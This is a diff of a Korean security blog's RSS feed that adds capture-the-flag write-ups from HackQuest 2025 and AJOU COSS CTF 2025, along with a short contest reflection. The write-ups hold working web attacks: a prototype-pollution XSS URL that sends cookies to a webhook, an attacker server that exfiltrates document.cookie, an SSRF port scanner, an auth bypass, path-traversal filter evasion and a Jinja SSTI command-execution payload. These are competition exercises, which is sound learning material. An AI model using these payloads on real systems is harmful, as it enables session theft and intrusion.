@@ -1,4 +1,319 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte_</title><description>My Blog</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>Physics I Problem Solving</title><link>https://fuwari.vercel.app/posts/physics/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/physics/</guid><description> </description><pubDate>Tue, 03 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;물리 실력이 부족하다는걸 느꼈다.&lt;/p&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte_</title><description>My Blog</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>2025 HackQuest [Simple Note] Write-Up</title><link>https://fuwari.vercel.app/posts/hackquest/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/hackquest/</guid><description> </description><pubDate>Tue, 22 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;카이스트에서 주최한 HackQuest에 참가했고 웹 4문제 중 3문제를 풀었다.&lt;br /&gt;
+못 푼 한 문제가 아래에서 설명할 &lt;code&gt;Simple Note&lt;/code&gt;보다 쉬운 문제였지만 헤메다 풀지 못했다.&lt;/p&gt;
+&lt;h2&gt;Simple Note (Web)&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;app.get(&apos;/track&apos;, (req, res) =&amp;gt; {
+  const id = req.query.id
+  const p = posts.get(id)
+  if (p &amp;amp;&amp;amp; p.author !== req.session.user) p.views++
+  res.end(p ? &apos;views:&apos; + p.views : &apos;&apos;)
+})
+
+app.get(&apos;/view&apos;, (req, res) =&amp;gt; {
+  const id = req.query.id
+  const p = posts.get(id)
+  if (!p) return res.status(404).send(&apos;not found&apos;)
+  res.send(`&amp;lt;!doctype html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
+    &amp;lt;script src=&quot;./config.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+    &amp;lt;script src=&quot;https://code.jquery.com/jquery-3.5.1.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+    &amp;lt;script src=&quot;https://cdn.jsdelivr.net/npm/qs@6.10.2/dist/qs.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+    &amp;lt;/head&amp;gt;&amp;lt;body id=&quot;main&quot;&amp;gt;
+    &amp;lt;div id=&quot;content&quot;&amp;gt;${DOMPurify.sanitize(p.html)}&amp;lt;/div&amp;gt;
+    &amp;lt;div id=&quot;out&quot;&amp;gt;&amp;lt;/div&amp;gt;
+    &amp;lt;/body&amp;gt;
+    &amp;lt;script&amp;gt;
+    let data = {}
+    function merge(target, source) {
+      for (const key in source) {
+        const value = source[key];
+        if (value &amp;amp;&amp;amp; typeof value === &apos;object&apos;) {
+          if (!target[key]) {
+            target[key] = {};
+          }
+          merge(target[key], value);
+        } else {
+          target[key] = value;
+        }
+      }
+      return target;
+    }
+
+    const params = Qs.parse(location.search.slice(1), { 
+        depth: window.options.depth ? window.options.depth : 5,
+        allowPrototypes: window.options.allowPrototypes ? true : false,
+        parameterLimit: window.options.parameterLimit ? window.options.parameterLimit: 5
+     })
+    merge(data, params)
+    $.get(&apos;/track?id=&apos;, data)
+    &amp;lt;/script&amp;gt;
+    &amp;lt;/html&amp;gt;`)
+})
+
+app.get(&apos;/config.js&apos;, (req, res) =&amp;gt; {
+  res.send(`
+  window.options = {}
+  window.options.depth = 20;
+  window.options.allowPrototypes = false;
+  window.options.parameterLimit = 20;  
+  `)
+})
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;작성한 노트를 그대로 보여주는 서비스이다.
+html 삽입은 가능하지만 &lt;code&gt;DOMPurify.sanitize()&lt;/code&gt; 되어 들어가기에 바로 XSS는 불가능하다.&lt;/p&gt;
+&lt;p&gt;qs@6.10.2에 &lt;code&gt;CVE-2022-24999&lt;/code&gt; Prototype pollution 취약점이 존재하고, &lt;code&gt;merge()&lt;/code&gt; 함수에서도 pp가 일어난다.
+그러나 &lt;code&gt;allowPrototypes&lt;/code&gt;가 false이기 때문에 바로 Prototype pollution 하는 것 또한 불가능하다.&lt;/p&gt;
+&lt;p&gt;일단 처음으로 해야할 건 RPO다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;script src=&quot;./config.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;상대 경로로 config.js를 로드하고 있기에 &lt;code&gt;/view/?id=id&lt;/code&gt; 처럼 뒤에 &lt;code&gt;/&lt;/code&gt;를 붙이면 config.js의 로드를 막을 수 있다.&lt;/p&gt;
+&lt;p&gt;어차피 allowPrototypes는 계속 false이다. 여기서 RPO를 일으키는건 window.options가 initialize 되지 않게 하기 위해서다.&lt;/p&gt;
+&lt;p&gt;window.options가 할당되어 있지 않기에 Dom Clobbering으로 options를 덮어 allowPrototypes를 true로 설정할 수 있다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;form name=&quot;options&quot;&amp;gt;
+     &amp;lt;input name=&quot;allowPrototypes&quot; value=&quot;true&quot;&amp;gt;
+&amp;lt;/form&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;이렇게 Dom Clobbering 페이로드를 작성한다&lt;/p&gt;
+&lt;p&gt;이제 &lt;code&gt;Prototype pollution&lt;/code&gt;이 가능해졌다. XSS는 여전히 불가능해보일 수 있지만
+여기서 찾은 방법이 &lt;code&gt;Jquery XSS by prototype pollution&lt;/code&gt; 이다.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$.get(&apos;/track?id=&apos;, data)&lt;/code&gt;를 마지막에 사용하기에 XSS를 트리거 할 수 있다.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md&quot;&gt;레퍼런스&lt;/a&gt;를 약간 변형해서 xss를 성공시켰다&lt;/p&gt;
+&lt;p&gt;최종 페이로드는 이렇다&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://158.247.241.230:10897/view/?id=29f97926-66da-4d01-9a80-b69c6b49da52&amp;amp;[constructor][prototype][url]=data:text/javascript;charset=utf-8,document.location.href=&apos;https://webhook/test?q=&apos;+%2Bdocument.cookie;//&amp;amp;[constructor][prototype][dataType]=script&amp;amp;[constructor][prototype][crossDomain]=
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;flag: hackquest2025{caf7088a3562e36cb29876b8dd45a3384f4b0d0533ecc2778234b845693eca03}&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item><item><title>AJOU COSS CTF 2025 Final 후기</title><link>https://fuwari.vercel.app/posts/cossctf-final/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/cossctf-final/</guid><description> </description><pubDate>Sun, 20 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;대회장 입장&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;./start.jpg&quot; alt=&quot;&quot; /&gt;
+아주대 COSS CTF 본선 갔다왔다. 하고 싶은 말이 많은데 생각나는대로 적어보겠다.&lt;/p&gt;
+&lt;p&gt;일단 9시에 30분 일찍 대회장 도착했다. 30분 동안 대기실에 있었는데 아는 사람이 없어서 구석에서 인스타 보고 있었다
+팀원들 만나고 대회장 들어갔다.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./teamtag.jpg&quot; alt=&quot;&quot; /&gt;
+강의실에서 대회 진행했는데 진짜 강의실 일체형 의자는 지옥이다. 대회 내내 허리아파 죽는줄 알았다&lt;/p&gt;
+&lt;p&gt;이름표 받았는데 주위 둘러보니까 이름 한 번씩 들어본 사람들이 꽤 있었다 현실에서 보니 신기했다&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;대회 시작&lt;/h2&gt;
+&lt;p&gt;일단 난 시작하자마자 웹을 잡았다.&lt;br /&gt;
+어차피 crypto나 분야별 쉬운 문제는 누군가 풀어줄거기에 플래그 욕심 안내고 웹만 하루종일 풀고 가자는 생각으로 했다.&lt;br /&gt;
+웹 문제는 블랙박스 3문제, 화이트 박스 1문제가 나왔다&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./first_prob.png&quot; alt=&quot;&quot; /&gt;
+첫번째는 저런식으로 입력하면 파일 다운해주는 서비스였다&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/flag&lt;/code&gt; 읽어오면 됐는데 경로 필터링때메 안읽혔다
+단순하게 &lt;code&gt;get .....///.....///.....///.....///.....///.....///flag&lt;/code&gt; 이런식으로 읽으면 읽어졌는데 이걸 못풀고 팀원이 익스했다.&lt;br /&gt;
+진짜 처음으로 CTF 풀다 현타가 왔다. 드림핵 레벨 1도 안 될법한 문제를 못 푼건 진짜 사고다.&lt;/p&gt;
+&lt;p&gt;그리고 블박 문제중에 &lt;code&gt;file:///&lt;/code&gt; 써서 서버코드 따고 &lt;code&gt;gopher://&lt;/code&gt;로 익스하는 SSRF 문제있었는데 이것도 끝날 때까지 못풀었다. file 생각못하고 진짜 이 세상에 존재하는 스키마 다 때려넣어봤는데..
+뭐 변명을 해보자면 오프라인 CTF가 처음이라 꽤 긴장하기도 했었고 내가 부족했던거도 맞다.&lt;br /&gt;
+당연히 모든 문제가 미친듯이 어려울줄 알았고, 서버세팅이 구버전인걸 보고 발광해서 CVE만 계속 찾는 헛짓거리를 한 것도 있다.&lt;/p&gt;
+&lt;p&gt;0솔 나온 블박 문제중에 하나를 잠깐 설명해보자면 글 쓰기, 읽기 등 기능이 있는 게시판 서비스가 있었는데 이게 싹 다 페이크였다.
+게시판 관련 기능 중엔 취약점 하나도 없었고 그냥 로그인 페이지 주석에 &lt;code&gt;/filter&lt;/code&gt; 경로 나와있었다
+여기에서 WAF 정보 보여주고 그냥 Sqli해서 어드민 따는 문제였다.&lt;/p&gt;
+&lt;p&gt;대회때 여기까진 파악했는데 sqli를 못했다.&lt;/p&gt;
+&lt;p&gt;내가 25년 초반에 웹해킹 시작할 때부터 SQL 문법 공부하기 싫어서 진짜 딱 그거만 빼고 공부했다&lt;/p&gt;
+&lt;p&gt;그 문제만 퍼블 냈어도 5등으로 턱걸이해서 상 받는건데 지금 생각하면 아쉽긴하다. 암튼 그래도 못 푼 건 못 푼거다.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;그래서 결국 난 0솔로 마무리했다.
+CTF하면서 0솔한건 처음 같은데 0솔한거 자체보단 당연히 풀법한 문제들을 못풀었다는게 더 참담했다.&lt;/p&gt;
+&lt;p&gt;다음 CTF까지는 팀원들한테 민폐 안끼치도록 열심히 공부할 생각이다.
+CCE 전까진 부족한 부분 기초 개념까진 메우고 드림핵 5~6레벨 위주로 풀어볼 생각이다&lt;/p&gt;
+</content:encoded></item><item><title>AJOU COSS CTF Pre-Qual 2025 Write-Up</title><link>https://fuwari.vercel.app/posts/cossctf/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/cossctf/</guid><description>3th</description><pubDate>Mon, 23 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Comment&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;./scoreboard.jpg&quot; alt=&quot;&quot; /&gt;
+운 좋게도 예선 3등했다.&lt;/p&gt;
+&lt;p&gt;아주대 CTF 열린다고 해서 세명컴고 팀원 두 분이랑 아는 웹 해커 한 분이랑 같이 예선 나갔다.&lt;br /&gt;
+팀원들이 다 열심히 해주기도 했고, 같이 웹 푼 팀원이 나랑 합이 꽤 잘 맞아서 잘 풀었던거 같다.&lt;/p&gt;
+&lt;p&gt;라이트업은 잘 모르는 분야까지 다 쓰긴 좀 그래서 웹만 써보겠다&lt;/p&gt;
+&lt;h2&gt;Solve&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;[Web] My WebView&lt;/li&gt;
+&lt;li&gt;[Web] Admin NAS&lt;/li&gt;
+&lt;li&gt;[Web] XSS Tester&lt;/li&gt;
+&lt;li&gt;[Web] Donation&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Write-Up&lt;/h2&gt;
+&lt;h3&gt;My WebView&lt;/h3&gt;
+&lt;p&gt;간단한 SSRF 문제이다&lt;/p&gt;
+&lt;p&gt;일단 기본적으로 링크를 넣으면 서버에서 요청해서 그걸 보여주는 서비스이다.&lt;/p&gt;
+&lt;p&gt;html에 ?list가 주석처리 되어 있고 접속해보면 서버 디렉토리 리스트를 준다.
+hosts에선 서버의 내부 아이피를, reports에선 내부망 포트 범위와 /flag 디렉토리의 존재를 알려준다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;const axios = require(&apos;axios&apos;);
+
+(async () =&amp;gt; {
+  for (let i = 1000; i &amp;lt;= 10000; i++) {
+    const res = await axios.get(`http://3.36.10.125/?url=http://192.168.200.110:${i}/internal`);
+
+    if(res.data !== &apos;&apos;) {
+      console.log(`Find Port! ${i}`);
+    }
+  }
+})();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;http://3.36.10.125/?url=http://192.168.200.110:5090/flag&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;이런식으로 브포 코드 짜서 포트 알아내고 플래그 읽어오면 된다.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{b59855ea1f33a1a8ec0cc0216abcd058603b5e34b86ea4e2344f8a0811bfa1cdd683be3badbe440835a3f685615628d5099d1f35209858e1241b587be593}&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;Admin NAS&lt;/h3&gt;
+&lt;p&gt;해외 CTF 어딘가에서 봤던 로직 그대로 나온 문제였는데 그걸 기억 못하고 많이 삽질했다&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;const users = {
+  admin: {
+    password: crypto.randomBytes(16).toString(&apos;hex&apos;), otp: &quot;disabled&quot;
+  },
+};
+
+const FILES_DIR = path.join(__dirname, &quot;public&quot;);
+
+const BLOCKED_KEYWORDS = [&quot;../&quot;, &quot;/proc&quot;, &quot;/bin&quot;, &quot;/etc&quot;, &quot;/flag.txt&quot;, &quot;/home&quot;, &quot;/root&quot;]
+
+const isAdmin = (req, res, next) =&amp;gt; {
+  if (req.session.isAdmin) {
+    next();
+  } else {
+    res.status(403).json({ message: &quot;ADMIN만 접근 가능합니다.&quot; });
+  }
+}
+
+app.get(&quot;/auth&quot;, (req, res) =&amp;gt; {
+  const { username, authType, value } = req.query;
+
+  if (!username || !authType || !value) return res.status(400).json({ message: &quot;Usage: ?username=&amp;amp;authType=&amp;amp;value=&quot; });
+  if (authType == &quot;otp&quot; &amp;amp;&amp;amp; isNaN(value)) return res.status(400).json({ message: &quot;OTP는 숫자만 사용할 수 있습니다.&quot; });
+
+  if (users[username][authType] == value) {
+    req.session.isAdmin = true;
+    res.status(200).json({ message: `환영합니다, ${username}님` })
+  }
+  else return res.status(401).json({ message: &quot;계정정보가 일치하지 않습니다.&quot; })
+});
+
+app.get(&quot;/download&quot;, isAdmin, (req, res) =&amp;gt; {
+  const { filename } = req.query;
+
+  if (!filename) return res.status(400).json({ message: &quot;Usage: ?filename=test.png&quot; });
+
+  BLOCKED_KEYWORDS.forEach(keyword =&amp;gt; {
+    if (filename.includes(keyword)) {
+        return res.status(400).json({ message: &quot;파일 이름이 올바르지 않습니다.&quot; });
+    }
+  });
+  const filePath = path.normalize(`${FILES_DIR}/${filename}`);
+  try {
+    return res.sendFile(filePath);
+  } catch {
+    return res.status(404).json({ message: &quot;파일을 찾을 수 없습니다.&quot; });
+  }
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;authType을 내 맘대로 넣을 수 있어서 굳이 OTP로 인증할 필요 없다&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://localhost:3000/auth?username=toString&amp;amp;authType=length&amp;amp;value=0&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;이런식으로 요청 보내서 어드민 따주면 된다.&lt;/p&gt;
+&lt;p&gt;이후 LFI는 쉬운데 &lt;code&gt;../&lt;/code&gt;랑 &lt;code&gt;flag&lt;/code&gt; 같은 문자열들을 다 필터링하기에&lt;br /&gt;
+&lt;code&gt;?filename[]=../flag.txt&lt;/code&gt;과 같이 filename을 객체로 만들어서 우회하면 필터링에 걸리지 않는다&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{0ba7873c0f9bdc1373cc7f330721ca96fcbef55e2f0912e44474505dca939bd5}&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;XSS Tester&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+
+if (isset($_GET[&quot;source&quot;])) {
+    show_source(__FILE__);
+    die();
+}
+
+$payload = isset($_GET[&quot;p&quot;]) ? $_GET[&quot;p&quot;] : &quot;&quot;;
+
+$nonce = md5(random_bytes(16));
+header(&quot;Content-Security-Policy: default-src &apos;none&apos;; style-src &apos;unsafe-inline&apos; *; script-src &apos;nonce-$nonce&apos;&quot;);
+?&amp;gt;
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&quot;en&quot;&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;
+    &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&amp;gt;
+    &amp;lt;title&amp;gt;XSS Blood&amp;lt;/title&amp;gt;
+    &amp;lt;link href=&quot;./bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&amp;gt;
+    &amp;lt;style&amp;gt;
+        body {
+            background-color: #f8f9fa;
+        }
+        .form-container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+        .form-header {
+            margin-bottom: 20px;
+        }
+    &amp;lt;/style&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+    &amp;lt;div class=&quot;container mt-5&quot;&amp;gt;
+        &amp;lt;div class=&quot;row justify-content-center&quot;&amp;gt;
+            &amp;lt;div class=&quot;col-md-8 col-lg-6&quot;&amp;gt;
+                &amp;lt;div class=&quot;form-container&quot;&amp;gt;
+                    &amp;lt;textarea class=&quot;form-control&quot; disabled&amp;gt;Welcome, &amp;lt;?= $payload ?&amp;gt;&amp;lt;/textarea&amp;gt;
+                &amp;lt;/div&amp;gt;
+
+                &amp;lt;script src=&quot;./loader.js&quot; nonce=&quot;&amp;lt;?=$nonce?&amp;gt;&quot;&amp;gt;&amp;lt;/script&amp;gt;
+            &amp;lt;/div&amp;gt;
+        &amp;lt;/div&amp;gt;
+    &amp;lt;/div&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;그냥 스크립트 삽입으로는 xss 안터지지만&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://13.125.240.40:8888/xss.php?p=a&amp;lt;/textarea&amp;gt;&amp;lt;base href=&quot;//222.121.122.208&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;textarea 끝내고 base 사용해서 nonce retargeting 해 &lt;code&gt;/loader.js&lt;/code&gt;가 내 서버로 요청하게 한다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;const express = require(&apos;express&apos;);
+
+const app = express();
+
+app.listen(80);
+
+app.use((req, res, next) =&amp;gt; {
+  res.send(`window.open(&apos;https://xjjcbot.request.dreamhack.games?q=&apos;+document.cookie)`);
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;서버에서 스크립트 보내서 쿠키 탈취했다&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{31837ae2b1fffc0d3f602eff406cebf936307e82904b0da5605c147ab465ee91}&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;Donation&lt;/h3&gt;
+&lt;p&gt;블랙박스 문제이다.&lt;br /&gt;
+로그인 한 후 가진 돈을 기부하는 기능이 있고 기부할 때 기부 메시지를 적을 수 있다.&lt;/p&gt;
+&lt;p&gt;여기서 방향성이 전혀 안보여서 애 좀 먹었다
+삽질하다보니 중괄호 넣고 요청하면 오류메시지가 출력 되는걸 알 수 있었고 서버가 python으로 돌아가고 있다는걸 http 헤더에서 발견해 SSTI라는걸 유추했다.&lt;/p&gt;
+&lt;p&gt;필터링이 좀 빡세게 걸려있어서 익스 못하고 있었는데 팀원분이 기가 막히게 익스해버리셨다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{% for key in self.__init__.__globals__.__builtins__.__import__(&apos;os&apos;).popen(&apos;cat flag&apos;).read() %}
+{% if key == &apos;f&apos; %}
+f
+{% elif key == &apos;0&apos; %}0
+{% elif key == &apos;1&apos; %}1
+{% elif key == &apos;2&apos; %}2
+{% elif key == &apos;3&apos; %}3
+{% elif key == &apos;4&apos; %}4
+{% elif key == &apos;5&apos; %}5
+{% elif key == &apos;6&apos; %}6
+{% elif key == &apos;7&apos; %}7
+{% elif key == &apos;8&apos; %}8
+{% elif key == &apos;9&apos; %}9
+{% elif key == &apos;a&apos; %}a
+{% elif key == &apos;b&apos; %}b
+{% elif key == &apos;c&apos; %}c
+{% elif key == &apos;d&apos; %}d
+{% elif key == &apos;e&apos; %}e
+{% elif key == &apos;f&apos; %}f
+{% elif key == &apos;A&apos; %}A
+{% elif key == &apos;B&apos; %}B
+{% elif key == &apos;C&apos; %}C
+{% elif key == &apos;D&apos; %}D
+{% elif key == &apos;E&apos; %}E
+{% elif key == &apos;F&apos; %}F
+{% elif key == &apos;l&apos; %}l
+{% elif key == &apos;g&apos; %}g
+
+{% else %}
+?
+{% endif %}
+{% endfor %}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;저렇게 다 따로 출력하는 이유는 플래그에 있는 중괄호 필터링 때문에 응답이 안와서 한 글자씩 중괄호만 빼고 출력해서 그렇다&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{c59abb2a665a38345ee0d92687aeec35002721ccfd12a807b802a3436afe6183bcc618e1953771fd39ed3d3bbd696f947b3e90408547246a}&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item><item><title>Physics I Problem Solving</title><link>https://fuwari.vercel.app/posts/physics/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/physics/</guid><description> </description><pubDate>Tue, 03 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;물리 실력이 부족하다는걸 느꼈다.&lt;/p&gt;
 &lt;p&gt;보안 문제 풀이 쓰는거 처럼 푼 물리문제 정리해놓으면 기억에 남을거 같아서 시작해본다.&lt;/p&gt;
 &lt;h2&gt;Solve&lt;/h2&gt;
 &lt;h3&gt;2019 학년도 9월 모평 6번&lt;/h3&gt;
@@ -527,7 +842,7 @@ threading.Thread(target=read_auth).start()
 그 사이에 auth로 빈 값 (&quot;&quot;)과 비교해 주면 플래그를 얻을 수 있다&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;codegate2025{8b2c743e13f766b30c9c1e72e8a6595a651321da1c01eda7776fbd8e209ef9feace5a162237e696ea4b58a7bdf0b88dfb7f25c5ac76f4e12a4c4538d438fcdbf}&lt;/code&gt;&lt;/p&gt;
 &lt;h3&gt;Masquerade&lt;/h3&gt;
-&lt;p&gt;업솔빙 때린 문제인데 인상깊어서 풀진 못했지만 적어본다. 못 푼 내가 할 말은 아니지만 주니어부 0솔까지 갈 문제는 아니었다고 생각한다&lt;/p&gt;
+&lt;p&gt;업솔빙 때린 문제인데 인상깊어서 풀진 못했지만 적어본다.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;./mar1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;비밀번호를 입력하면 uuid 하나를 만들어주는데 로그인 해보면 MEMBER 역할이 기본적으로 할당 되어있다.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;const puppeteer = require(&apos;puppeteer&apos;);
